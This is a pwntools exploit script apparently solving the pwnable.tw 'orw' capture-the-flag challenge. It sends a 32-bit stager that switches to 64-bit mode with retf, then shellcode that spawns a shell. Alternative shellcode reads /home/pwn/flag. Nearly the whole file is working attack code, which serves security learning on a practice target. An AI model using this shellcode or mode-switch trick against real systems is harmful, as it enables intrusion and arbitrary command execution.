#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./orw.dms"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("chall.pwnable.tw",10001)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()

# 32 write,  retf 64
shellcode3 = """
.code32
   mov eax,3
   mov ebx,0
   mov ecx, 0x804a000
   mov edx, 0x100
   int 0x80

   push 0x00000033
   push 0x804a000
   retf
"""
sh3 = asm(shellcode3)
context.arch = 'amd64'
read_shell = asm(shellcraft.sh())
shellcode = """
  call here
  .ascii "/home/pwn/flag"
  .byte 0`
here:
  pop rdi
  mov rax, 0x2
  xor rsi, rsi
  mov rdx, 0x4
  syscall
  mov rdi, 0x3
  xor rax, rax
  mov rsi, 0x804a000
  mov rdx, 0x100
  syscall
  mov rax,0x1
  mov rsi, 0x804a000
  mov rdx,0x100
  mov rdi,0x1
  syscall
"""

shellcode2 = """
  call here
  .ascii "/home/pwn/flag"
  .byte 0
here:
   pop ebx
   mov eax, 5
   mov ecx, 0
   mov edx, 4
   int 0x80
   mov ebx, 3
   mov ecx, 0x804a000
   mov edx, 0x100
   mov eax, 0x03
   int 0x80
   mov ebx, 1
   mov ecx, 0x804a000
   mov edx, 0x100
   mov eax, 0x04
   int 0x80
"""
debug()
#sh = asm(shellcode2)
#r.send(sh)

#w= r.recv()
r.sendline(sh3)
r.sendline(read_shell)
r.interactive()
